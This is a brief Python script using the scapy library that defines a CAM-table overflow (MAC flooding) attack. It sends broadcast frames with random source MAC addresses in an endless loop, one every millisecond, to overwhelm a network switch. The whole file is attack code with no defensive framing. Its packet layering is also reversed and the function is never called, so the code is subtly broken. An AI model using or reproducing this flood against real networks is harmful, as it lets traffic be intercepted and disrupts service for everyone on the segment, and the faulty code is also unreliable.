#! /usr/bin/env python3 
from scapy.all import *
from scapy import *


def CAMtableOverflow(cls):
    e = Ether(src=RandMAC() , dst = "ff:ff:ff:ff:ff:ff")
    a = ARP(pdst="255.255.255.255",hwdst="ff:ff:ff:ff:ff:ff")
    sendp((a/e),loop=1,inter=.001)


